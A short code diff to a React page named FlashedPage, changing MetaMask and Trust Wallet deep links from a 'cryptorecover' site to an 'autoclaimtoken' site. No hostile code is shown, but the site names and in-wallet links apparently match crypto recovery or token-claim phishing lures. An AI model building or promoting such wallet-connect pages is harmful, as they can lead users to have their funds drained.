@@ -560,7 +560,7 @@ export default function FlashedPage() {
                 </div>
                 <div className="space-y-3">
                   <a 
-                    href="https://metamask.app.link/dapp/cryptorecover.vercel.app/flashed"
+                    href="https://metamask.app.link/dapp/autoclaimtoken.vercel.app/flashed"
                     className="flex items-center w-full bg-orange-600 hover:bg-orange-700 p-4 rounded-lg text-white font-semibold"
                   >
                     <div className="w-8 h-8 bg-orange-500 rounded-full mr-3 flex items-center justify-center">
@@ -569,7 +569,7 @@ export default function FlashedPage() {
                     MetaMask
                   </a>
                   <a 
-                    href="https://link.trustwallet.com/open_url?coin_id=60&url=https://cryptorecover.vercel.app/flashed"
+                    href="https://link.trustwallet.com/open_url?coin_id=60&url=https://autoclaimtoken.vercel.app/flashed"
                     className="flex items-center w-full bg-blue-600 hover:bg-blue-700 p-4 rounded-lg text-white font-semibold"
                   >
                     <div className="w-8 h-8 bg-blue-500 rounded-full mr-3 flex items-center justify-center">
